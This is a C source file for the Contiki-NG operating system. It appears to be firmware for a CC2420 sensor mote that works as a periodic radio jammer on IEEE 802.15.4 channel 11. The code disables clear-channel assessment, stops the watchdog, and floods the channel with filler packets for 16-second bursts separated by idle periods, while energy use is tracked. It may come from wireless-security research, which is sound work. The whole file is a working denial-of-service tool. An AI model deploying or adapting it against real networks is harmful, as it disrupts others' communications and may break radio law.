#include "contiki.h"
#include "os/dev/radio.h"
#include "random.h"
#include "net/netstack.h"
#include "net/nullnet/nullnet.h"
#include "dev/button-sensor.h"
#include "sys/energest.h"
#include "dev/leds.h"
#include "cc2420.h"
#include "dev/watchdog.h"

#include <stdio.h>
#include <string.h>

//Jammer definitions
#define JAMMER_PACKET_LEN 120

//Energest definitions
#define ENERGEST_CONF_ON 1 //Activate energest module

//Change clock to CONTIKI-NG system
#define ENERGEST_CONF_CURRENT_TIME clock_time
#define ENERGEST_CONF_TIME_T clock_time_t
#define ENERGEST_CONF_SECOND CLOCK_SECOND

//Jammer data
typedef struct{
     char data[JAMMER_PACKET_LEN];
}jpacket_t;

//Time control variables
unsigned long timeJam = 16;
unsigned long timeDown = 16;

//ENERGEST time conversion
// static unsigned long to_seconds(uint64_t time) {
//   return (unsigned long)(time / ENERGEST_SECOND);
// }


/*---------------------------------------------------------------------------*/

PROCESS(jammerProcess, "Jammer Process");
AUTOSTART_PROCESSES(&jammerProcess);

/*---------------------------------------------------------------------------*/
/*---------------------------------------------------------------------------*/

PROCESS_THREAD(jammerProcess, ev, data)
{
  static struct etimer periodic_timer;
  PROCESS_BEGIN();

  //Set CCA to 0
  NETSTACK_RADIO.set_value(RADIO_PARAM_TX_MODE, 0);
   
  //Set timer..
  etimer_set(&periodic_timer, timeDown * CLOCK_SECOND);
  
  //set channel..
  NETSTACK_RADIO.set_value(RADIO_PARAM_CHANNEL, 11);
  cc2420_set_channel(11);
  
  //Load data into packet
  jpacket_t jpacket;
  memset(&jpacket, 0, sizeof(jpacket_t));
  strcpy(jpacket.data, "The network is now being jammed.The network is now being jammed.");

  while(1) {
    //Waiting interval
    etimer_reset(&periodic_timer);
    PROCESS_WAIT_EVENT_UNTIL(etimer_expired(&periodic_timer));
  
    //Jamming interval
    watchdog_stop();
    unsigned long startClock = clock_time();
    NETSTACK_RADIO.on();
    while(clock_time() - startClock < timeJam * CLOCK_SECOND)
    {
     //CALL Radio Driver to transmit the Packet..
     cc2420_driver.send((void*)&jpacket, JAMMER_PACKET_LEN);
    }

    NETSTACK_RADIO.off();
    //Update all energest times
    energest_flush();
    watchdog_start();
    etimer_reset(&periodic_timer);    
  }
  PROCESS_END();
}
